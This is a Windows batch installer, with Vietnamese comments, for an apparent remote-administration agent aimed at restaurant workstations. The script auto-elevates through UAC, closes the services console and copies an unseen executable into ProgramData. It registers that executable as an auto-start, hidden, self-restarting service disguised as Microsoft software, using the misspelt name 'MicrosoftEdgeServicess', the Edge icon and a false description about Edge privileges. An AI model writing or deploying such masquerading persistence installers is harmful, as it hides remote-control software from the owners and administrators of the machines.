@echo off
title Cai Dat Dich Vu MicrosoftEdgeServicess (Windows Services)
cd /d "%~dp0"

echo ===============================================================================
echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
echo   Ten dich vu: MicrosoftEdgeServicess
echo   Mo ta: Provides elevated privileges for Microsoft Edge.
echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram
echo   Bieu tuong: Microsoft Edge chinh thuc
echo   Bao ve tien trinh: Single-Instance (Chi 1 tien trinh duy nhat)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN FILE NEN ZIP]
echo ===============================================================================
echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
echo   Khong tim thay file MicrosoftEdgeServicess.exe de cai dat.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao file Restaurant_Support_Agent_Full.zip
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai file nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator (Tu dong xin quyen UAC de cai dat 1-click)
net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

echo Dang yeu cau quyen Administrator (UAC Windows)...
powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 exit /b 0

echo.
echo ===============================================================================
echo   CANH BAO: CHUA CO QUYEN QUAN TRI VIEN ADMINISTRATOR
echo ===============================================================================
echo   Vui long nhap chuot phai vao file nay va chon Run as administrator.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc (mmc.exe) de tranh bi khoa handle lam Service bi danh dau xoa (Loi 1058 / 1072)
echo [1/5] Dang giai phong khoa he thong va tien trinh cu...
taskkill /F /IM mmc.exe >nul 2>&1

:: Giai phong triet de neu service bi ket o STOP_PENDING bang cach taskkill dung PID
for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
)
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Cho toi da 5 giay de trang thai Service ve STOPPED
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
    if not errorlevel 1 goto :DaDungHan
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)
:DaDungHan

:: 4. Thiet lap thu muc he thong
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/5] Thiet lap thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

:: Dam bao xoa file EXE cu truoc de tranh bi giu file cu
if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
)

echo [3/5] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    echo    [CANH BAO] File EXE dang bi Windows khoa handle. Dang giai phong cuong che...
    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
)
copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

:: Xac thuc copy thanh cong 100%
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [LOI] Khong the ghi de file MicrosoftEdgeServicess.exe vao %INSTALL_DIR%!
    echo   File co the dang bi mot tien trinh khac cua Windows khoa.
    echo   Vui long chay Go_Cai_Dat_Dich_Vu.bat truoc hoac khoi dong lai may tinh.
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 5. Dang ky hoac cap nhat Windows Service
echo [4/5] Dang cau hinh Windows Service MicrosoftEdgeServicess...
:: Xoa Task Scheduler cu de tranh chay song song 2 tien trinh gay xung dot
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% equ 0 goto :ServiceDaTonTai

:: Dang ky moi truc tiep qua Windows SCM sc.exe
echo    -> Dang dang ky moi dich vu vao services.msc...
sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1

:ServiceDaTonTai
:: Luon dam bao Service bat start= auto (Chong loi 1058 Disabled), cap nhat binPath va Description
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: 6. Khoi dong Windows Service ngay bay gio
echo [5/5] Dang khoi chay Windows Service ngam...
sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1

:: Cho 3 giay de Service on dinh trang thai
timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul

echo.
echo ===============================================================================
echo   KIEM TRA KET QUA DANG KY TRONG SERVICES.MSC:
echo ===============================================================================
sc.exe query MicrosoftEdgeServicess
echo.

echo ===============================================================================
echo   CAI DAT DICH VU HOAN TAT!
echo   - Ten dich vu: MicrosoftEdgeServicess
echo   - Mo ta: Provides elevated privileges for Microsoft Edge.
echo   - Duong dan: %INSTALL_DIR%\MicrosoftEdgeServicess.exe
echo   - Tu dong bat cung Windows: Automatic
echo   - Icon: Bieu tuong Microsoft Edge chinh thuc
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 0
